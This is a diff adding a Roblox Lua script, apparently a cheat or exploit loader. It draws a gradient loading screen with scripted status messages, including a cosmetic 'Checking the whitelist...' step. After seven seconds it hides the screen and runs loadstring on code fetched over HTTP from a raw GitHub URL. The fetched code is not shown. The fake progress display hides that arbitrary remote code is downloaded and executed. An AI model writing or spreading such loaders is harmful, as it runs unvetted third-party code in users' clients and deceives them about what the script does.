@@ -1,0 +1,93 @@
+local _4 = Instance.new("ScreenGui")
+local F = Instance.new("Frame")
+local UIGradient = Instance.new("UIGradient")
+local l = Instance.new("ImageLabel")
+local q = Instance.new("TextLabel")
+local l_2 = Instance.new("ImageLabel")
+
+_4.Name = "4"
+_4.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+_4.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+F.Name = "F"
+F.Parent = _4
+F.BackgroundColor3 = Color3.fromRGB(0, 221, 255)
+F.BorderSizePixel = 0
+F.Position = UDim2.new(0.416682184, 0, 0.354629636, 0)
+F.Size = UDim2.new(0, 278, 0, 4)
+
+UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 115, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
+UIGradient.Parent = F
+
+l.Name = "l"
+l.Parent = F
+l.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+l.BorderSizePixel = 0
+l.Position = UDim2.new(0.000927605666, 0, 0.937037051, 0)
+l.Size = UDim2.new(0, 278, 0, 342)
+l.Image = "rbxassetid://10180491900"
+
+q.Name = "q"
+q.Parent = l
+q.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+q.BackgroundTransparency = 1.000
+q.BorderSizePixel = 0
+q.Position = UDim2.new(0.134093523, 0, 0.784953237, 0)
+q.Size = UDim2.new(0, 200, 0, 50)
+q.Font = Enum.Font.Code
+q.Text = "Loading the scripts..."
+q.TextColor3 = Color3.fromRGB(255, 255, 255)
+q.TextSize = 23.000
+q.TextWrapped = true
+
+l_2.Name = "l"
+l_2.Parent = F
+l_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+l_2.BackgroundTransparency = 1.000
+l_2.Position = UDim2.new(0.127604187, 0, 11.2203674, 0)
+l_2.Size = UDim2.new(0, 206, 0, 192)
+l_2.Image = "rbxassetid://10180712811"
+
+local function FPMKIFR_fake_script() -- F.l 
+	local script = Instance.new('LocalScript', F)
+
+	local text = script.Parent
+	local uiGradient = text:WaitForChild("UIGradient")
+	local tweenService = game:GetService("TweenService")
+	
+	while true do
+	        local tween = tweenService:Create(uiGradient, TweenInfo.new(2, Enum.EasingStyle.Linear), {Offset = Vector2.new(-1, 0)})
+	        tween:Play()
+	        wait(2)
+	        local tween2 = tweenService:Create(uiGradient, TweenInfo.new(2, Enum.EasingStyle.Linear), {Offset = Vector2.new(1, 0)})
+	        tween2:Play()
+	        wait(2)
+	end
+	
+	
+end
+coroutine.wrap(FPMKIFR_fake_script)()
+local function HJHKA_fake_script() -- F.l 
+	local script = Instance.new('LocalScript', F)
+
+	wait(7)
+	script.Parent.Visible = false
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/kl0nx/v3patru/main/vpetru'),true))()
+end
+coroutine.wrap(HJHKA_fake_script)()
+local function XUAPOO_fake_script() -- q.u 
+	local script = Instance.new('LocalScript', q)
+
+	
+	script.Parent.Text = "Loading the scripts..."
+	wait(3)
+	script.Parent.Text = "Loading the interface..."
+	wait(2)
+	script.Parent.Text = "Checking the whitelist..."
+	wait(1)
+	script.Parent.Text = "Initializing..."
+	wait(1)
+	script.Parent.TextTransparency = 1
+	
+end
+coroutine.wrap(XUAPOO_fake_script)()
